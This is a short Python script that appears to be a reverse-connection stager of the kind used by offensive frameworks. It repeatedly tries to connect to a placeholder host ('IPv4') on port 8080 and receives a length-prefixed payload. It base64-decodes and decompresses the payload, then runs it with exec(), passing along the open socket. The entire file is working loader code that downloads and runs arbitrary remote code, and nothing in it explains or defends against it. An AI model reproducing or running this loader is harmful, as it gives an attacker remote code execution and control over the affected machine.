import socket
import struct
import time
import zlib
import base64

for x in range(10):
	try:
		s = socket.socket(2,socket.SOCK_STREAM)
		s.connect(("IPv4", 8080))
		break
	except:
		time.sleep(5)

l = struct.unpack('>l', s.recv(4))[0]
d = s.recv(l)
while len(d)<l:
	d += s.recv(l-len(d))

exec(zlib.decompress(base64.b64decode(d)), {'s':s})

